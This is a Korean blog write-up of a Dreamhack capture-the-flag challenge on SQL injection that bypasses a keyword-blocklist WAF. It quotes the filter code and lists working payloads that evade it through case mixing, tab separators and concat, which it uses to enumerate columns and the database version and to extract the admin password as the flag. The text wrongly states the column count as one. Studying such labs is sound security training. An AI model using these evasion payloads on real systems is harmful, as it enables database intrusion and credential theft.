---
layout: single
title: "Dreamhack [sql injection bypass WAF] 문제풀이"
categories: Security
toc: true
author_profile: false
sidebar:
  nav: "docs"
---

## Dreamhack_by_pass_sqli
Dreamhack 해커들의 놀이터 SQL Injection bypass WAF 풀기

## Black Box 방식으로 공격해보기
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/a19047d6-ca96-4e23-b911-396ea5c9dca9)

> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/a9db8751-a5ce-47e8-8a17-a7e4846b26d1)

- sql 문법이 막히는 것을 보아 필터링이 되는 것 같다

## 코드 분석하기.

```
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data:
            return True

    return False

@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
```
위 코드를 보면 sql 특적 키워드들이 값으로 들어오면 필터링 돼서 WAF로 인해 막힌다는 메시지가 출력된다.
그렇다면 소문자를 대문자로 바꿔 컬럼 갯수를 알아내는 공격을 해보자.

- 컬럼 수 확인하기.
```
'	oRder	by	1#
'	oRder	by	2#
'	oRder	by	3#
'	oRder	by	4#
```
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/cc963842-806d-4f2f-b366-b01a3cb4df73)

> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/148149c7-dd6b-4643-aa78-4152a8b4c720)

> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/9a198866-a0f5-4892-af3f-c4caf7078997)
 
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/24837302-278d-4e81-b9c6-c0e31cdbfc7f) ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/3ad6428f-4124-4a14-a4bc-2cfe66958196)

'	oRder	by	4# 에서 에러가 발생하는것으로 보아 컬럼의 갯수는 1개이다.

## 컬럼특성 및 DB version 확인하기.
```
'	Union	Select	@@version,null,null#
'	Union	Select	null,@@version,null#
```
- 위 구문으로 2번째 컬럼이 문자열이라는 것을 알아 냈다. 또한 DB 버전도 알아냈다.
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/62084023-65c8-4edd-8eff-d695daeeef5b)
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/5a292eba-c7ad-41fb-949f-ce037602a4bd)

## 컬럼명 확인하기
- 테이블 명이 user라고 나와 있으므로 그걸 이용해 데이터베이스 information_schema.columns 테이블에 있는 값으로 user테이블의 컬럼명을 알아보자.
```
'	Union	Select	null,column_name,null	From	infOrmation_schema.columns	Where	table_name='user'#
'	Union	Select	null,column_name,null	From	infOrmation_schema.columns	Where	table_name='user'	LIMIT	1	OFFSET	1#
'	Union	Select	null,column_name,null	From	infOrmation_schema.columns	Where	table_name='user'	LIMIT	1	OFFSET	2#
```
- 위 sqli 공격으로 3개의 컬럼명을 알아냈다.
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/0fc9cc40-d60c-4c2d-80c5-1185d978a839)
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/b55d4c81-6948-478a-8c2d-830ca2b503fc)
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/c6a24639-6871-44a6-86c9-98f0b2065d2a)

## flag 값 확인하기.
- 우리는 컬럼명, 컬럼 갯수를 알아냈으므로 그 정보를 이용해 flag 값을 알아낼것이다. flag는 uid가 admin인 행의 upw값이다.
```
'	Union	Select	null,upw,null	From	user	Where	uid=concat('ad','min')#
```
> ![image](https://github.com/hanmin0512/dreamhack_by_pass_sqli/assets/37041208/285d849b-11e1-46b6-af6c-83abea29c17b)


- <a href= "https://github.com/hanmin0512/dreamhack_by_pass_sqli"> [sql injection bypass WAF 문제풀이  github 보러가기</a>
